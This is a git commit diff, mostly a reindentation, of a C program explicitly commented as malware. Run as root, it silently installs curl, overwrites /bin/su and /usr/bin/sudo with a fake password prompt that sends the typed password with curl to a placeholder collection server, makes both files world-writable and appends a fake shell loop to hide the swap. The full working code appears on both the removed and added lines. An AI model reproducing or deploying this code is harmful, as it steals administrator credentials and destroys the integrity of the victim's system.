85e77579509fdf2a8cc5e1be2926f891af63bb03
Eduardo <41192980+blueudp@users.noreply.github.com>
2018-09-21 09:54:18 +0200

    Update Cmd_Prompt_Client.c

--- files/Cmd_Prompt_Client.c
+++ files/Cmd_Prompt_Client.c
@@ -6,80 +6,73 @@
 
 int main () {
 
-  /** CHECK ROOT **/
+    /** CHECK ROOT **/
 
-   if(geteuid() != 0) {
+    if(geteuid() != 0) {
 
-      printf("Err.: This program must be run as root.\n");
-      return 0;
+        printf("Err.: This program must be run as root.\n");
+        return 0;
   
-   }
+    }
 
 
-   /** INSTALL PACKAGE.  /DEV/NULL HIDE COMMAND EXIT **/
+    /** INSTALL PACKAGE.  /DEV/NULL HIDE COMMAND EXIT **/
 
 
-   system("apt install curl > /dev/null 2>&1");
-   system("apt-get install curl > /dev/null 2>&1");
-   system("yum install curl > /dev/null 2>&1");
-   system("aptitude install curl > /dev/null 2>&1");
+    system("apt install curl > /dev/null 2>&1");
+    system("apt-get install curl > /dev/null 2>&1");
+    system("yum install curl > /dev/null 2>&1");
+    system("aptitude install curl > /dev/null 2>&1");
 
 
-   /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
+    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
   
-   FILE *file1; /** MALICIUS FILE **/
-   /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
-   char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
+    FILE *file1; /** MALICIUS FILE **/
+    /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
+    char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
 
-   file1 = fopen("/bin/su", "w");
+    file1 = fopen("/bin/su", "w");
 
-   if(file1 == NULL) {
+    if(file1 == NULL) {
+        printf("Err.: Try executing me again...");	
+    } else {
+    fwrite(cmmd1, sizeof(cmmd1), 1, file1);
+    fclose(file1);
+    }
 
-	printf("Err.: Try executing me again...");
+    /** GIVE 777 **/
+
+    system("chmod 777 /bin/su > /dev/null 2>&1");
+
+    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
+
+    FILE *file2;
 	
-   } else {
-
-	fwrite(cmmd1, sizeof(cmmd1), 1, file1);
-
-	fclose(file1);
+    /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
 	
-   }
+    char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
 
-/** GIVE 777 **/
+    file2 = fopen("/usr/bin/sudo", "w");
 
-system("chmod 777 /bin/su > /dev/null 2>&1");
+    if(file2 == NULL) {
+
+        printf("Err.: Try executing me again...");
+    } else {
+        fwrite(&cmmd2, sizeof(cmmd2), 1, file2);
+        fclose(file2);
+    }
 
 
-/** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
-
-
-   FILE *file2;
-   /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
-   char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
-
-   file2 = fopen("/usr/bin/sudo", "w");
-
-   if(file2 == NULL) {
-
-	printf("Err.: Try executing me again...");
+    /** GIVE 777 **/
 	
-   } else {
+    system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
 
-	fwrite(&cmmd2, sizeof(cmmd2), 1, file2);
+    /** POP UP A SHELL TO HIDE THE MALWARE..., TO LATE !!!!**/
 
-	fclose(file2);
-	
-   }
+    system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /bin/su");
+    system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /usr/bin/sudo");
 
-
-/** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
-
-/** POP UP A SHELL TO HIDE THE MALWARE..., TO LATE !!!!**/
-
-system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /bin/su");
-system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /usr/bin/sudo");
-
-   return(0);
+    return(0);
 
 } 
 
